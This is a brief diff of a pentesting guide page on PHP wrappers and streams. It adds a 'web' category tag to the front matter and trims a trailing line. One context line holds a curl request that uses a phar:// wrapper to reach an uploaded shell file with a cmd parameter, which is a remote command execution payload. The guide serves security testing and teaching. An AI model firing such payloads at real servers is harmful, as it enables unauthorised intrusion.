@@ -1,5 +1,6 @@
 ---
 authors: LucasParsy, ShutdownRepo
+category: web
 ---
 
 # PHP wrappers and streams
@@ -116,4 +117,3 @@ curl --user-agent "PENTEST" "$URL/?parameter=phar://./shell.jpg%2Fshell.txt&cmd=
 ```
 
 :::
-
